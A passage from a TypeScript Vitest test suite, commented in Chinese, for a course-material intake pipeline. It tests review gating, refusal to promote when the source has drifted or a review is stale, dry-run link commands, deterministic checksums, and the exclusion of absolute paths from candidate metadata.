      const gate = gateFor(env, stored, parsed.file, parsed.errors, stored.metadata.matching.canonicalLibrary.digest);

      const promoted = promoteCourseCandidate({
        stored,
        gate,
        review: parsed.file,
        coursesDir: env.coursesDir,
        candidateDir: dir,
      });

      if (!promoted.ok) {
        // 门禁未通过时不得写任何东西
        expect(existsSync(join(env.coursesDir, "test-course"))).toBe(false);
        return;
      }

      expect(existsSync(join(env.coursesDir, "test-course", "course.json"))).toBe(true);
      expect(existsSync(join(env.coursesDir, "test-course", "candidate.json"))).toBe(false);
      expect(existsSync(join(env.coursesDir, "test-course", "review.json"))).toBe(false);
      // 晋升后必须能被生产导入器读到
      const found = new NormalizedCourseImporter(env.coursesDir).discover();
      expect(found).toHaveLength(1);
    } finally {
      env.dispose();
    }
  });

  it("目标已存在 ⇒ 拒绝覆盖（不静默替换运行时课程包）", async () => {
    const env = makeEnv();
    try {
      const { result } = await intake(env, readingFixture());
      const dir = join(env.candidatesDir, "test-course");
      mkdirSync(dir, { recursive: true });
      const { writeCourseCandidate } = await import("@/content/course-pipeline/candidate");
      writeCourseCandidate(result.archive, dir);
      writeReview(env, "test-course");

      const stored = readStoredCandidate("test-course", env.candidatesDir);
      const parsed = validateCourseReviewFile(JSON.parse(readFileSync(join(dir, "review.json"), "utf8")));
      const gate = gateFor(env, stored, parsed.file, parsed.errors, stored.metadata.matching.canonicalLibrary.digest);

      // 预先放一个同名目标
      mkdirSync(join(env.coursesDir, "test-course"), { recursive: true });

      const promoted = promoteCourseCandidate({
        stored,
        gate,
        review: parsed.file,
        coursesDir: env.coursesDir,
        candidateDir: dir,
      });
      expect(promoted.ok).toBe(false);
      expect(promoted.error).toMatch(/已存在/);
    } finally {
      env.dispose();
    }
  });

  it("门禁未通过时 promote 拒绝执行且不写任何文件", async () => {
    const env = makeEnv();
    try {
      const { result } = await intake(env, readingFixture());
      const dir = join(env.candidatesDir, "test-course");
      mkdirSync(dir, { recursive: true });
      const { writeCourseCandidate } = await import("@/content/course-pipeline/candidate");
      writeCourseCandidate(result.archive, dir);
      const stored = readStoredCandidate("test-course", env.candidatesDir);

      const gate = gateFor(env, stored, null, [], stored.metadata.matching.canonicalLibrary.digest);
      const promoted = promoteCourseCandidate({ stored, gate, review: null, coursesDir: env.coursesDir });
      expect(promoted.ok).toBe(false);
      expect(promoted.error).toMatch(/拒绝晋升/);
      expect(existsSync(join(env.coursesDir, "test-course"))).toBe(false);
    } finally {
      env.dispose();
    }
  });
});

// ===========================================================================
// 链接交接计划
// ===========================================================================

describe("链接交接 —— 只打印命令，绝不执行", () => {
  it("accepted_suggestion 生成命令，且**不带** --commit", async () => {
    const env = makeEnv();
    try {
      const { result } = await intake(env, readingFixture(), { withPapers: true });
      const dir = join(env.candidatesDir, "test-course");
      mkdirSync(dir, { recursive: true });
      const { writeCourseCandidate } = await import("@/content/course-pipeline/candidate");
      writeCourseCandidate(result.archive, dir);
      writeReview(env, "test-course");

      const stored = readStoredCandidate("test-course", env.candidatesDir);
      const parsed = validateCourseReviewFile(JSON.parse(readFileSync(join(dir, "review.json"), "utf8")));
      // F12：交接计划**绑定门禁** —— 先求门禁，再生成计划
      const gate = gateFor(env, stored, parsed.file, parsed.errors, stored.metadata.matching.canonicalLibrary.digest);
      const plan = buildLinkPlan({
        stored,
        review: parsed.file,
        gate,
      });
      expect(plan.allowed).toBe(true);

      for (const entry of plan.entries) {
        expect(entry.command).toContain("--status verified");
        // 关键：不得带 --commit（默认 dry-run ⇒ 误执行也只校验）
        expect(entry.command).not.toContain("--commit");
        expect(entry.command).toContain("--ref");
        expect(entry.command).toContain("pnpm course:link");
      }
    } finally {
      env.dispose();
    }
  });

  it("intentionally_unmatched 不产生任何命令（未匹配是合法状态）", async () => {
    const env = makeEnv();
    try {
      const { result } = await intake(env, readingFixture(), { withPapers: true });
      const dir = join(env.candidatesDir, "test-course");
      mkdirSync(dir, { recursive: true });
      const { writeCourseCandidate } = await import("@/content/course-pipeline/candidate");
      writeCourseCandidate(result.archive, dir);
      writeReview(env, "test-course", { dispositions: "unmatched" });

      const stored = readStoredCandidate("test-course", env.candidatesDir);
      const parsed = validateCourseReviewFile(JSON.parse(readFileSync(join(dir, "review.json"), "utf8")));
      const gate = gateFor(env, stored, parsed.file, parsed.errors, stored.metadata.matching.canonicalLibrary.digest);
      const plan = buildLinkPlan({
        stored,
        review: parsed.file,
        gate,
      });
      expect(plan.entries).toHaveLength(0);
    } finally {
      env.dispose();
    }
  });

  it("没有 review ⇒ 没有链接计划", () => {
    expect(MATCH_DISPOSITIONS).toContain("intentionally_unmatched");
    expect(MATCH_DISPOSITIONS).toContain("accepted_suggestion");
    expect(MATCH_DISPOSITIONS).toContain("rejected_suggestion");
    // 三个处置里**没有** verified
    expect(MATCH_DISPOSITIONS).not.toContain("verified");
  });
});

// ===========================================================================
// 端到端与确定性
// ===========================================================================

describe("端到端 —— 同输入幂等、异输入可辨", () => {
  it("同样的源目录重复运行 ⇒ 候选校验和相同（幂等）", async () => {
    const env = makeEnv();
    try {
      const tree = fullCourseFixture();
      const a = await intake(env, tree, { courseId: "course-a" });
      const b = await intake(env, tree, { courseId: "course-a" });
      expect(a.result.archive.metadata.digests.candidateChecksum).toBe(
        b.result.archive.metadata.digests.candidateChecksum,
      );
      // course.json 必须逐字节相同
      expect(a.result.archive.files.get("course.json")!.toString("utf8")).toBe(
        b.result.archive.files.get("course.json")!.toString("utf8"),
      );
    } finally {
      env.dispose();
    }
  });

  it("源内容变化 ⇒ 候选校验和变化（陈旧复核可达）", async () => {
    const env = makeEnv();
    try {
      const a = await intake(env, readingFixture(), { courseId: "course-a" });
      const changed = readingFixture();
      changed.set("阅读/reading-handout.pdf", buildTextPdf([["Passage One", "Completely different content appears now."]]));
      const b = await intake(env, changed, { courseId: "course-a" });
      expect(a.result.archive.metadata.digests.candidateChecksum).not.toBe(
        b.result.archive.metadata.digests.candidateChecksum,
      );
      expect(a.result.archive.metadata.digests.sourceDigest).not.toBe(
        b.result.archive.metadata.digests.sourceDigest,
      );
    } finally {
      env.dispose();
    }
  });

  it("DOCX 在完整链路里始终是 TEXT_EXTRACTION_DEFERRED，文本绝不被假装抽出", async () => {
    const env = makeEnv();
    try {
      const { result } = await intake(env, pdfPlusDocxFixture());
      const deferred = result.documents.filter((doc) => doc.state === "deferred");
      expect(deferred.length).toBeGreaterThan(0);
      for (const doc of deferred) {
        expect(doc.deferredMarker).toBe("TEXT_EXTRACTION_DEFERRED");
        expect(doc.pages).toEqual([]);
      }
      // 复核事项里必须可见
      expect(
        result.archive.review.some((item) => item.code === "text_extraction_deferred"),
      ).toBe(true);
    } finally {
      env.dispose();
    }
  });

  it("候选里不出现任何绝对路径（含源目录路径）", async () => {
    const env = makeEnv();
    try {
      const { result, sourceRoot } = await intake(env, fullCourseFixture());
      const serialized = JSON.stringify(result.archive.metadata);
      expect(serialized).not.toContain(env.root);
      expect(serialized).not.toContain(sourceRoot);
      expect(serialized).not.toContain(tmpdir());
      // 源根标签只有目录名
      expect(result.archive.metadata.sourceRootLabel).not.toContain("/");
      expect(result.archive.metadata.sourceRootLabel).not.toContain("\\");
    } finally {
      env.dispose();
    }
  });

  it("禁止的匹配特征清单被登记（文件名/套别号/物理顺序/题号/课程答案/文件夹名）", () => {
    expect(FORBIDDEN_MATCH_FEATURES).toContain("fileName");
    expect(FORBIDDEN_MATCH_FEATURES).toContain("providerSetLabel");
    expect(FORBIDDEN_MATCH_FEATURES).toContain("physicalOrder");
    expect(FORBIDDEN_MATCH_FEATURES).toContain("bareQuestionNumber");
    expect(FORBIDDEN_MATCH_FEATURES).toContain("courseAnswerKey");
    expect(FORBIDDEN_MATCH_FEATURES).toContain("folderName");
  });

  it("候选包里的 review 事项记录了结构（code/severity/where/detail）", async () => {
    const env = makeEnv();
    try {
      const { result } = await intake(env, fullCourseFixture());
      expect(result.archive.review.length).toBeGreaterThan(0);
      for (const item of result.archive.review) {
        expect(typeof item.code).toBe("string");
        expect(["blocking", "advisory"]).toContain(item.severity);
        expect(typeof item.where).toBe("string");
        expect(item.detail.length).toBeGreaterThan(10);
      }
    } finally {
      env.dispose();
    }
  });

  it("buildCourseCandidate 的 manifest 是稳定序列化（键序不因对象构造顺序而变）", async () => {
    const env = makeEnv();
    try {
      const { result } = await intake(env, readingFixture());
      const again = toCourseManifestJson(result.archive.manifest);
      expect(JSON.stringify(again)).toBe(JSON.stringify(toCourseManifestJson(result.archive.manifest)));
    } finally {
      env.dispose();
    }
  });
});

// ===========================================================================
// F8 —— 裁决必须**按类型**化解阻断事项
// ===========================================================================

/**
 * 把所有需要复核的事项都写成 `accepted`（即"全部确认"），
 * 得到一份**基准可通过**的复核记录。
 *
 * 各用例在此基础上**只破坏一处**，从而把失败精确归因到那一条判据。
 */
function acceptAllReview(stored: ReturnType<typeof readStoredCandidate>, overrides: Record<string, unknown> = {}) {
  return {
    courseId: stored.metadata.courseId,
    reviewer: "vitest",
    reviewedAt: "2026-01-01",
    candidateChecksum: stored.recomputed.candidateChecksum,
    canonicalLibraryDigest: stored.metadata.matching.canonicalLibrary.digest,
    materialGroupings: stored.metadata.grouping.proposals
      .filter((proposal) => proposal.reviewRequired)
      .map((proposal) => ({
        proposalId: proposal.id,
        decision: "accepted",
        note: "确认该分组。",
        evidence: "测试夹具依据候选记录的 basis 与 evidence 作出该裁决（≥10 字符）。",
      })),
    segments: stored.metadata.segmentation.materials
      .flatMap((material) => material.segments)
      .filter((segment) => segment.reviewRequired)
      .map((segment) => ({
        segmentId: segment.id,
        decision: "accepted",
        note: "确认该段。",
        evidence: "测试夹具依据候选记录的 evidence.cues 与 lineSpan 作出该裁决（≥10 字符）。",
      })),
    matches: [],
    verifiedScope: ["测试夹具：候选结构、资产完整性与门禁路径"],
    notVerified: ["未做任何 canonical 对应关系的人工核验"],
    ...overrides,
  };
}

/**
 * 构造一份"接受机器实际提出过的建议"的匹配裁决。
 *
 * ── 为什么必须**照抄** target 的粒度 ──
 *
 * 门禁 `match_decisions_reference_proposed_suggestions` 要求裁决的
 * `(paperId, sectionId, groupId, questionId)` **精确等于**机器提出过的某个目标。
 * 机器的目标带具体 `groupId`（例如 `reading.careful_reading#g1`），
 * 因此用 `section` 粒度 + `groupId: null` 去"接受"它会被正确地判为
 * "该组合不在候选建议里" —— 那不是门禁太严，而是裁决指向了另一个粒度。
 *
 * 因此这里从 suggestion 直接推导 scope 与各 id。
 */
function acceptedMatchEntry(
  segmentId: string,
  target: { paperId: string; sectionId: string; groupId: string | null; questionId: string | null },
  evidence = "测试夹具：接受机器提出过的该建议（≥10 字符）。",
) {
  const targetScope = target.questionId !== null ? "question" : target.groupId !== null ? "group" : "section";
  return {
    segmentId,
    disposition: "accepted_suggestion" as const,
    paperId: target.paperId,
    targetScope,
    sectionId: target.sectionId,
    groupId: targetScope === "section" ? null : target.groupId,
    questionId: targetScope === "question" ? target.questionId : null,
    note: "接受该建议。",
    evidence,
  };
}
/** 落盘候选 + 写 review + 求值门禁（走**真实**磁盘与真实门禁实现）。 */
function setupGate(
  env: TempEnv,
  courseId: string,
  tree: Map<string, Buffer>,
  reviewOverrides: Record<string, unknown> | ((stored: ReturnType<typeof readStoredCandidate>) => Record<string, unknown>) = {},
  options: { complete?: boolean; sourceRootOverride?: string | null } = {},
) {
  // 同步入口：调用方已写好源（见各用例），这里只负责候选/review/门禁
  const dir = join(env.candidatesDir, courseId);
  const stored = readStoredCandidate(courseId, env.candidatesDir);
  const overrides = typeof reviewOverrides === "function" ? reviewOverrides(stored) : reviewOverrides;
  const raw = acceptAllReview(stored, overrides);
  writeFileSync(join(dir, "review.json"), JSON.stringify(raw, null, 2), "utf8");
  const parsed = validateCourseReviewFile(raw);
  const gate = gateFor(env, stored, parsed.file, parsed.errors, stored.metadata.matching.canonicalLibrary.digest, options);
  return { stored, dir, parsed, gate, raw };
}

/** 建候选：写源 + 抽取 + 落盘候选。 */
async function prepareCandidate(
  env: TempEnv,
  courseId: string,
  tree: Map<string, Buffer>,
  withPapers = false,
) {
  const standardRoot = join(env.contentRoot, "course-sources");
  const sourceRoot = join(standardRoot, courseId);
  mkdirSync(sourceRoot, { recursive: true });
  writeSourceTree(sourceRoot, tree);
  if (withPapers) {
    writeFixturePackage(env.contentRoot, "fixture-paper", buildFixturePackage({ contentVersion: 1 }));
  }
  const result = await runCourseIntake({
    sourceRoot,
    courseId,
    provider: "test_fixture_provider",
    edition: "test",
    title: "测试课程包",
    contentVersion: 1,
    provenance: { note: "合成夹具", reference: null, rightsNote: "合成夹具，无第三方权利。" },
    papersDir: env.papersDir,
    standardSourcesRoot: standardRoot,
  });
  const dir = join(env.candidatesDir, courseId);
  mkdirSync(dir, { recursive: true });
  writeCourseCandidate(result.archive, dir);
  return { result, sourceRoot, standardRoot, dir };
}

describe("F8 —— 复核裁决必须按类型化解阻断事项（不能串台）", () => {
  it("基准：全部 accepted 时可以晋升（证明后续用例的失败来自那一处破坏）", async () => {
    const env = makeEnv();
    try {
      await prepareCandidate(env, "f8-base", readingFixture());
      const { gate } = setupGate(env, "f8-base", readingFixture());
      expect(gate.status).toBe("PROMOTABLE");
    } finally {
      env.dispose();
    }
  });

  it("**匹配裁决不能化解段复核**：无 segments[] 但给出匹配裁决 ⇒ 仍不可晋升", async () => {
    const env = makeEnv();
    try {
      await prepareCandidate(env, "f8-match", readingFixture());
      const { gate } = setupGate(env, "f8-match", readingFixture(), (stored) => ({
        // 刻意**清空** segments[]，只留匹配裁决
        segments: [],
        matches: stored.metadata.matching.segments.map((segment) => ({
          segmentId: segment.segmentId,
          disposition: "intentionally_unmatched",
          paperId: null,
          targetScope: null,
          sectionId: null,
          groupId: null,
          questionId: null,
          note: "有意不匹配。",
          evidence: "测试夹具：明确声明有意不匹配（≥10 字符）。",
        })),
      }));

      expect(gate.status).not.toBe("PROMOTABLE");
      const check = gate.checks.find((c) => c.name === "blocking_review_items_resolved");
      expect(check?.passed).toBe(false);
      // 措辞必须指出**缺少段裁决**，而不是笼统说"未裁决"
      expect(check?.detail).toMatch(/segments\[\]|匹配裁决不能代替段裁决/);
      // 且必须点明段裁决与匹配裁决是两件事
      expect(check?.detail).toMatch(/边界|类别/);
    } finally {
      env.dispose();
    }
  });

  it("匹配裁决可以化解**匹配层**的歧义事项（它本来就是匹配层的）", async () => {
    const env = makeEnv();
    try {
      // fullCourseFixture 更容易产生歧义项；即使没有歧义，本用例也只断言"匹配层不被段裁决串台"
      await prepareCandidate(env, "f8-amb", fullCourseFixture(), true);
      const { stored } = setupGate(env, "f8-amb", fullCourseFixture());
      // 只断言：歧义事项（若有）需要在 matches[] 里被处置
      const ambiguous = stored.metadata.matching.segments.filter((s) => s.ambiguous);
      if (ambiguous.length === 0) return; // 夹具未产生歧义 ⇒ 本用例不适用
      const { gate } = setupGate(env, "f8-amb", fullCourseFixture(), {
        matches: ambiguous.map((segment) => ({
          segmentId: segment.segmentId,
          disposition: "intentionally_unmatched",
          paperId: null,
          targetScope: null,
          sectionId: null,
          groupId: null,
          questionId: null,
          note: "歧义：有意不匹配。",
          evidence: "测试夹具：歧义显式声明有意不匹配（≥10 字符）。",
        })),
      });
      expect(gate.checks.find((c) => c.name === "ambiguous_matches_dispositioned")?.passed).toBe(true);
    } finally {
      env.dispose();
    }
  });

  it("抽取层事项（无文本层 / 空资产 / 分组不变量）**不可**被任何裁决化解", async () => {
    const env = makeEnv();
    try {
      await prepareCandidate(env, "f8-never", imageOnlyPdfFixture());
      // 即使把 review 写得"能写的都写了"，无文本层仍然无法被化解
      const { gate } = setupGate(env, "f8-never", imageOnlyPdfFixture(), {}, { complete: true });
      expect(gate.status).not.toBe("PROMOTABLE");
      const check = gate.checks.find((c) => c.name === "blocking_review_items_resolved");
      expect(check?.passed).toBe(false);
      expect(check?.detail).toMatch(/事实缺陷|重新生成候选/);
    } finally {
      env.dispose();
    }
  });

  it("isBlockingItemResolved 的类型分派是显式的（每条事项只认它需要的那种裁决）", () => {
    const decisions = {
      decidedGroupings: new Set(["proposal-1"]),
      decidedSegments: new Set(["segment-1"]),
      decidedMatches: new Set(["segment-1", "segment-2"]),
    };
    const base = { severity: "blocking" as const, detail: "d", evidence: null };

    // 分组事项：只认分组裁决
    expect(isBlockingItemResolved({ ...base, code: "material_grouping_requires_review", where: "proposal-1" }, decisions).resolved).toBe(true);
    expect(isBlockingItemResolved({ ...base, code: "material_grouping_requires_review", where: "segment-1" }, decisions).resolved).toBe(false);

    // 段事项：只认段裁决 —— 即使 matches 里有同名 segment
    expect(isBlockingItemResolved({ ...base, code: "segment_requires_review", where: "segment-1" }, decisions).resolved).toBe(true);
    expect(isBlockingItemResolved({ ...base, code: "segment_requires_review", where: "segment-2" }, decisions).resolved).toBe(false);

    // 段级源件异常：只认**那一段**的段裁决
    expect(isBlockingItemResolved({ ...base, code: "source_anomaly", where: "segment-1@q46" }, decisions).resolved).toBe(true);
    expect(isBlockingItemResolved({ ...base, code: "source_anomaly", where: "segment-2@q46" }, decisions).resolved).toBe(false);

    // 匹配层事项：只认匹配裁决
    expect(isBlockingItemResolved({ ...base, code: "match_ambiguous", where: "segment-2" }, decisions).resolved).toBe(true);
    expect(isBlockingItemResolved({ ...base, code: "match_ambiguous", where: "proposal-1" }, decisions).resolved).toBe(false);

    // 抽取层事实缺陷：永远不解决
    for (const code of ["extraction_failed", "page_without_text_layer", "empty_asset", "grouping_invariant_violated"] as const) {
      const outcome = isBlockingItemResolved({ ...base, code, where: "segment-1" }, decisions);
      expect(outcome.resolved, `${code} 不得被裁决化解`).toBe(false);
      expect(outcome.reason).toMatch(/重新生成候选/);
    }
  });
});

// ===========================================================================
// F9 —— rejected / excluded 是"当前候选不可晋升"，不是"已解决"
// ===========================================================================

describe("F9 —— rejected / excluded 的 V1 语义（当前候选不可晋升）", () => {
  it("需要复核的分组 + accepted ⇒ 可满足该项门禁", async () => {
    const env = makeEnv();
    try {
      await prepareCandidate(env, "f9-a", pdfPlusDocxFixture());
      const { stored } = setupGate(env, "f9-a", pdfPlusDocxFixture());
      const proposals = stored.metadata.grouping.proposals.filter((p) => p.reviewRequired);
      expect(proposals.length).toBeGreaterThan(0);
      const { gate } = setupGate(env, "f9-a", pdfPlusDocxFixture());
      expect(gate.checks.find((c) => c.name === "material_grouping_decisions_complete")?.passed).toBe(true);
      expect(gate.checks.find((c) => c.name === "rejected_groupings_block_promotion")?.passed).toBe(true);
    } finally {
      env.dispose();
    }
  });

  it("需要复核的分组 + rejected ⇒ **不可晋升**（且提示重新生成候选）", async () => {
    const env = makeEnv();
    try {
      await prepareCandidate(env, "f9-b", pdfPlusDocxFixture());
      const { gate } = setupGate(env, "f9-b", pdfPlusDocxFixture(), (stored) => ({
        materialGroupings: stored.metadata.grouping.proposals
          .filter((p) => p.reviewRequired)
          .map((p) => ({
            proposalId: p.id,
            decision: "rejected",
            note: "这份分组是错的。",
            evidence: "测试夹具：该分组把两份不同内容当成一份（≥10 字符）。",
          })),
      }));

      expect(gate.status).toBe("BLOCKED");
      const check = gate.checks.find((c) => c.name === "rejected_groupings_block_promotion");
      expect(check?.passed).toBe(false);
      // 必须给出可执行的处置方向
      expect(check?.detail).toMatch(/重新生成候选|course:extract/);
      // 且明确说明"晋升会原样复制被否决的结构"
      expect(check?.detail).toMatch(/原样复制/);
    } finally {
      env.dispose();
    }
  });

  it("需要复核的段 + accepted ⇒ 可满足该项门禁", async () => {
    const env = makeEnv();
    try {
      await prepareCandidate(env, "f9-c", readingFixture());
      const { gate } = setupGate(env, "f9-c", readingFixture());
      expect(gate.checks.find((c) => c.name === "excluded_segments_block_promotion")?.passed).toBe(true);
      expect(gate.checks.find((c) => c.name === "blocking_review_items_resolved")?.passed).toBe(true);
    } finally {
      env.dispose();
    }
  });

  it("需要复核的段 + excluded ⇒ **不可晋升**（不再是死路：语义是「当前候选不行」）", async () => {
    const env = makeEnv();
    try {
      await prepareCandidate(env, "f9-d", readingFixture());
      const { stored } = setupGate(env, "f9-d", readingFixture());
      const target = stored.metadata.segmentation.materials
        .flatMap((material) => material.segments)
        .find((segment) => segment.reviewRequired);
      expect(target).toBeDefined();

      const { gate } = setupGate(env, "f9-d", readingFixture(), (s) => ({
        segments: s.metadata.segmentation.materials
          .flatMap((material) => material.segments)
          .filter((segment) => segment.reviewRequired)
          .map((segment) => ({
            segmentId: segment.id,
            decision: segment.id === target!.id ? "excluded" : "accepted",
            note: "这一段不该存在。",
            evidence: "测试夹具：该段边界或归类错误（≥10 字符）。",
          })),
      }));

      expect(gate.status).toBe("BLOCKED");
      const check = gate.checks.find((c) => c.name === "excluded_segments_block_promotion");
      expect(check?.passed).toBe(false);
      expect(check?.detail).toMatch(/重新生成候选|course:extract/);
      expect(check?.detail).toMatch(/原样复制/);
      // 必须说明**不会**自动删段（那会让复核与校验和脱钩）
      expect(check?.detail).toMatch(/不会.*自动删段|脱钩/);
    } finally {
      env.dispose();
    }
  });

  it("被否决/排除的结构**绝不会**被复制到 courses/", async () => {
    const env = makeEnv();
    try {
      await prepareCandidate(env, "f9-e", readingFixture());
      const target = readStoredCandidate("f9-e", env.candidatesDir).metadata.segmentation.materials
        .flatMap((material) => material.segments)
        .find((segment) => segment.reviewRequired)!;

      const { stored, parsed, gate } = setupGate(env, "f9-e", readingFixture(), (s) => ({
        segments: s.metadata.segmentation.materials
          .flatMap((material) => material.segments)
          .filter((segment) => segment.reviewRequired)
          .map((segment) => ({
            segmentId: segment.id,
            decision: segment.id === target.id ? "excluded" : "accepted",
            note: "排除该段。",
            evidence: "测试夹具：排除该段用于验证不得晋升（≥10 字符）。",
          })),
      }));

      const promoted = promoteCourseCandidate({
        stored,
        gate,
        review: parsed.file,
        coursesDir: env.coursesDir,
        candidateDir: stored.candidateDir,
      });
      // 门禁 BLOCKED ⇒ 拒绝且**一个文件都不写**
      expect(promoted.ok).toBe(false);
      expect(existsSync(join(env.coursesDir, "f9-e"))).toBe(false);
      expect(existsSync(join(env.coursesDir, "f9-e", "course.json"))).toBe(false);
    } finally {
      env.dispose();
    }
  });
});

// ===========================================================================
// F10 —— 源漂移必须在**不重跑抽取**的情况下被检测到
// ===========================================================================

describe("F10 —— 抽取之后源漂移必须被检测（无需重跑抽取）", () => {
  it("抽取后改动源字节 ⇒ 复核门禁拒绝，且**未重跑抽取**", async () => {
    const env = makeEnv();
    try {
      const { sourceRoot } = await prepareCandidate(env, "f10-a", readingFixture());
      // 先证明：未改动源时是可晋升的（否则下面的失败不能归因于漂移）
      const base = setupGate(env, "f10-a", readingFixture());
      expect(base.gate.status).toBe("PROMOTABLE");

      // 关键：**只改源字节**，不重跑 course:extract
      const before = readStoredCandidate("f10-a", env.candidatesDir).metadata.inventory.digest;
      writeFileSync(
        join(sourceRoot, "阅读", "reading-handout.pdf"),
        buildTextPdf([["Passage One"], ["The source bytes have been replaced entirely."]]),
      );

      const { gate } = setupGate(env, "f10-a", readingFixture());
      expect(gate.status).not.toBe("PROMOTABLE");
      const check = gate.checks.find((c) => c.name === "source_current_and_unchanged");
      expect(check?.passed).toBe(false);
      expect(check?.detail).toMatch(/源已漂移/);

      // 候选记录的摘要**没有**被自动更新（绝不静默刷新）
      const after = readStoredCandidate("f10-a", env.candidatesDir).metadata.inventory.digest;
      expect(after).toBe(before);
    } finally {
      env.dispose();
    }
  });

  it("漂移时晋升被拒绝，courses/ 下不产生任何目录", async () => {
    const env = makeEnv();
    try {
      const { sourceRoot } = await prepareCandidate(env, "f10-b", readingFixture());
      writeFileSync(join(sourceRoot, "阅读", "reading-handout.pdf"), buildTextPdf([["Entirely new content here."]]));

      const { stored, parsed, gate } = setupGate(env, "f10-b", readingFixture());
      const promoted = promoteCourseCandidate({
        stored,
        gate,
        review: parsed.file,
        coursesDir: env.coursesDir,
        candidateDir: stored.candidateDir,
      });
      expect(promoted.ok).toBe(false);
      expect(existsSync(join(env.coursesDir, "f10-b"))).toBe(false);
    } finally {
      env.dispose();
    }
  });

  it("源字节**相同** ⇒ 判为 current（不会误报漂移）", async () => {
    const env = makeEnv();
    try {
      const { sourceRoot } = await prepareCandidate(env, "f10-c", readingFixture());
      const standardSourcesRoot = join(env.contentRoot, "course-sources");
      const stored = readStoredCandidate("f10-c", env.candidatesDir);

      const first = checkSourceCurrentness({ stored, standardSourcesRoot });
      expect(first.state).toBe("current");
      expect(first.currentDigest).toBe(first.recordedDigest);

      /*
       * 重写**完全相同的字节**（模拟"文件被重新拷贝了一份、内容没变"）。
       * 摘要只看 (路径, 字节数, sha256)，因此必须仍然判 current ——
       * 否则每次 touch 都会让复核无谓地陈旧。
       */
      const original = readFileSync(join(sourceRoot, "阅读", "reading-handout.pdf"));
      writeFileSync(join(sourceRoot, "阅读", "reading-handout.pdf"), original);

      const second = checkSourceCurrentness({
        stored: readStoredCandidate("f10-c", env.candidatesDir),
        standardSourcesRoot,
      });
      expect(second.state).toBe("current");
    } finally {
      env.dispose();
    }
  });

  it("源目录被删除 ⇒ 判为 unavailable 且晋升被拒（证明不了 ≠ 没问题）", async () => {
    const env = makeEnv();
    try {
      const { sourceRoot } = await prepareCandidate(env, "f10-d", readingFixture());
      rmSync(sourceRoot, { recursive: true, force: true });

      const { stored, parsed, gate } = setupGate(env, "f10-d", readingFixture());
      const check = gate.checks.find((c) => c.name === "source_current_and_unchanged");
      expect(check?.passed).toBe(false);
      expect(gate.status).not.toBe("PROMOTABLE");

      const promoted = promoteCourseCandidate({
        stored,
        gate,
        review: parsed.file,
        coursesDir: env.coursesDir,
        candidateDir: stored.candidateDir,
      });
      expect(promoted.ok).toBe(false);
    } finally {
      env.dispose();
    }
  });

  it("**标准源树**内的源 ⇒ 自动重新清点（无需 --source-root）", async () => {
    const env = makeEnv();
    try {
      const { result } = await prepareCandidate(env, "f10-e", readingFixture());
      // 定位符必须是 standard，且是**相对**路径
      expect(result.archive.metadata.inventory.sourceLocator.kind).toBe("standard");
      if (result.archive.metadata.inventory.sourceLocator.kind === "standard") {
        const locator = result.archive.metadata.inventory.sourceLocator.locator;
        expect(locator).not.toContain("..");
        expect(locator.startsWith("/")).toBe(false);
        expect(/^[a-zA-Z]:/.test(locator)).toBe(false);
      }
      const stored = readStoredCandidate("f10-e", env.candidatesDir);
      const currentness = checkSourceCurrentness({
        stored,
        standardSourcesRoot: join(env.contentRoot, "course-sources"),
      });
      expect(currentness.state).toBe("current");
      expect(currentness.locatorKind).toBe("standard");
    } finally {
      env.dispose();
    }
  });

  it("**外部源根**抽取 ⇒ 绝不持久化绝对路径；未提供 --source-root 时判 unavailable", async () => {
    const env = makeEnv();
    try {
      // 源放在标准树**之外** ⇒ 必须是 external 定位符
      const externalRoot = join(env.root, "external-source");
      mkdirSync(externalRoot, { recursive: true });
      writeSourceTree(externalRoot, readingFixture());

      const result = await runCourseIntake({
        sourceRoot: externalRoot,
        courseId: "f10-f",
        provider: "test_fixture_provider",
        edition: null,
        title: "外部源",
        contentVersion: 1,
        provenance: { note: "n", reference: null, rightsNote: "r" },
        papersDir: env.papersDir,
        // 刻意提供标准树根 ⇒ 但源在其外，所以仍应是 external
        standardSourcesRoot: join(env.contentRoot, "course-sources"),
      });

      const locator = result.archive.metadata.inventory.sourceLocator;
      expect(locator.kind).toBe("external");
      expect(locator.locator).toBeNull();

      // 绝对路径**绝不**出现在候选里
      const serialized = JSON.stringify(result.archive.metadata);
      expect(serialized).not.toContain(env.root);
      expect(serialized).not.toContain(externalRoot);
      expect(serialized).not.toContain(tmpdir());

      const dir = join(env.candidatesDir, "f10-f");
      mkdirSync(dir, { recursive: true });
      writeCourseCandidate(result.archive, dir);

      const stored = readStoredCandidate("f10-f", env.candidatesDir);
      // 未提供 --source-root ⇒ 无法证明 ⇒ unavailable
      const without = checkSourceCurrentness({
        stored,
        standardSourcesRoot: join(env.contentRoot, "course-sources"),
      });
      expect(without.state).toBe("unavailable");
      expect(without.detail).toMatch(/--source-root|外部源根/);

      // 显式提供 ⇒ 可以证明（源未漂移 ⇒ current）
      const withOverride = checkSourceCurrentness({
        stored,
        standardSourcesRoot: join(env.contentRoot, "course-sources"),
        sourceRootOverride: externalRoot,
      });
      expect(withOverride.state).toBe("current");
    } finally {
      env.dispose();
    }
  });

  it("漂移后**重新抽取** ⇒ 新候选校验和，旧复核陈旧", async () => {
    const env = makeEnv();
    try {
      const { sourceRoot, standardRoot } = await prepareCandidate(env, "f10-g", readingFixture());
      const oldChecksum = readStoredCandidate("f10-g", env.candidatesDir).recomputed.candidateChecksum;

      // 改源 + 重新抽取
      writeFileSync(join(sourceRoot, "阅读", "reading-handout.pdf"), buildTextPdf([["Passage One"], ["New source content after drift."]]));
      const again = await runCourseIntake({
        sourceRoot,
        courseId: "f10-g",
        provider: "test_fixture_provider",
        edition: "test",
        title: "测试课程包",
        contentVersion: 1,
        provenance: { note: "合成夹具", reference: null, rightsNote: "合成夹具，无第三方权利。" },
        papersDir: env.papersDir,
        standardSourcesRoot: standardRoot,
      });
      rmSync(join(env.candidatesDir, "f10-g"), { recursive: true, force: true });
      writeCourseCandidate(again.archive, join(env.candidatesDir, "f10-g"));

      const newChecksum = readStoredCandidate("f10-g", env.candidatesDir).recomputed.candidateChecksum;
      expect(newChecksum).not.toBe(oldChecksum);

      // 旧复核（绑定旧校验和）必须陈旧
      const stored = readStoredCandidate("f10-g", env.candidatesDir);
      const staleReview = acceptAllReview(stored, { candidateChecksum: oldChecksum });
      writeFileSync(join(env.candidatesDir, "f10-g", "review.json"), JSON.stringify(staleReview, null, 2), "utf8");
      const parsed = validateCourseReviewFile(staleReview);
      const gate = gateFor(env, stored, parsed.file, parsed.errors, stored.metadata.matching.canonicalLibrary.digest);
      expect(gate.checks.find((c) => c.name === "review_bound_to_current_candidate")?.passed).toBe(false);
